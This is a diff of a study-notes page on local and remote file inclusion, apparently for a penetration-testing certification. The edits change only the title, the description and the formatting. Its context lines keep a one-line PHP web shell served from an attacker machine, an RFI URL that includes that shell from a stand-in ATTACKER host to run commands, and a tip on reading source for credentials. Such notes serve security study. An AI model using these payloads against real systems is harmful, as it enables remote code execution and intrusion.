@@ -1,6 +1,11 @@
 ---
-title: "LFI / RFI"
+title: "LFI - RFI"
+description: "CPTS study notes, workflows, and references from the vault."
 ---
+
+{/* Generated from Web/LFI - RFI.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
 **LFI** includes a local file into the page; **RFI** includes a remote one (often RCE). Look for `?page=`, `?file=`, `?lang=` style parameters.
 
@@ -28,6 +33,5 @@ echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
 http://$IP/?page=http://ATTACKER/sh.php&0=id
 ```
 
-<Tip>
-Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
-</Tip>
+
+> Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
